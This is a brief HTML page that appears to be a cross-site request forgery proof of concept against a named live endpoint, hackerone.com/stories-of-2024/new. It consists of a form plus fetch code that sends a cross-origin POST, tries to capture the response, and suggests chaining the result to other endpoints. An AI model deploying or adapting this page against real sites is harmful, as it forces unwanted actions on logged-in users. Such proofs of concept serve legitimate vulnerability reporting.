<html>
  <body>
    <form id="myForm" method="POST" action="https://hackerone.com/stories-of-2024/new">
      <input type="submit" value="Submit request" />
    </form>

    <script>
      // Intercept the form submission to capture the response
      document.getElementById("myForm").onsubmit = function(event) {
        event.preventDefault();  // Prevent the form from submitting the usual way

        // Create a FormData object to gather the form data
        const formData = new FormData(document.getElementById("myForm"));

        // Send the form data using fetch with a fully qualified URL
        fetch("https://hackerone.com/stories-of-2024/new", {
          method: "POST",
          body: formData,
        })
        .then((response) => {
          if (!response.ok) {
            // Handle any HTTP errors (e.g., 404, 500)
            throw new Error("Network response was not ok");
          }
          return response.json();  // Parse the response as JSON (adjust based on your server's response format)
        })
        .then((data) => {
          // Capture and process the response data
          console.log("Response data:", data);

          // Now you can use the response data in further logic
          // For example, you can use it to send a request to another endpoint
        })
        .catch((error) => {
          // Handle any errors during the fetch request
          console.error("There was a problem with the fetch operation:", error);
        });
      };

      // Optionally, trigger the form submission automatically (you can remove this if not needed)
      // document.forms[0].submit();  // This will trigger the submit event and initiate the fetch logic
    </script>
  </body>
</html>
